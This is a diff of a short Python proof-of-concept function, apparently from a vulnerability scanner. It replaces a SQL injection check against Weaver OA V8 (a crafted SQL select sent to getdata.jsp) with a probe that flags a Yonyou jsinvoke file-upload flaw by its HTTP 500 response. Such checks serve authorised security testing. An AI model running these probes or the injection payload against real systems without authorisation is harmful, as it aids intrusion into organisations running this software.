@@ -8,10 +8,11 @@ headers = {
 def poc(target):
     try:
         target = get_standard_url(target)
-        url = target + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+6412121cbb2dc2cb9e460cfee7046be+as+id'
-        req = httpx.get(url,headers=headers)
-        if "6412121cbb2dc2cb9e460cfee7046be" in req.text and req.status_code == 200:
-            print("\033[0;31m 泛微OA V8 SQL注入漏洞："+ url )
+        url = target + '/uapjs/jsinvoke/?action=invoke'
+        req = httpx.post(url,headers=headers)
+        if req.status_code == 500:
+            if "Internal Server Error" in req.text or '内部服务器错误' in req.text:
+                print("\033[0;31m 存在用友jsinvoke文件上传漏洞："+ url )
     except:
         pass
 
